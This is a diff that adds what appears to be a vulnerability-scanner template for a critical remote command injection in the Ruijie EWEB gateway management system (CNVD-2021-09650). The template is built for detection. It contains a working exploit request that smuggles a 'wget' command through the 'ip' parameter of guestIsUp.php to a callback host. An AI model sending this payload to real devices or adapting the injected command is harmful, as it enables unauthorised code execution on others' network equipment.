@@ -1,0 +1,26 @@
+## id: CNVD-2021-09650
+## name: Ruijie Networks-EWEB Network Management System - Remote Code Execution
+## author: hack007x
+## severity: critical
+## tags: cnvd,cnvd2021,ruijie,rce,vuln,oob
+## description: Ruijie EWEB Gateway Platform is susceptible to remote command injection attacks.
+## cvss-score: 10
+## reference: http://j0j0xsec.top/2021/04/22/%E9%94%90%E6%8D%B7EWEB%E7%BD%91%E5%85%B3%E5%B9%B3%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/
+## reference: https://github.com/yumusb/EgGateWayGetShell_py/blob/main/eg.py
+## reference: https://www.ruijienetworks.com
+## verification: true
+
+POST /guest_auth/guestIsUp.php HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+mac=1&ip=127.0.0.1|wget {{oob_domain}}
+
+#@ oob: http
+#@ matcher: oob_received == true
+
+
+
+
+
+# @VEIL-STAMP: d6f995ab48fbed6d596edede713a0908b6dceed59b55c8faa1f72e065b088432
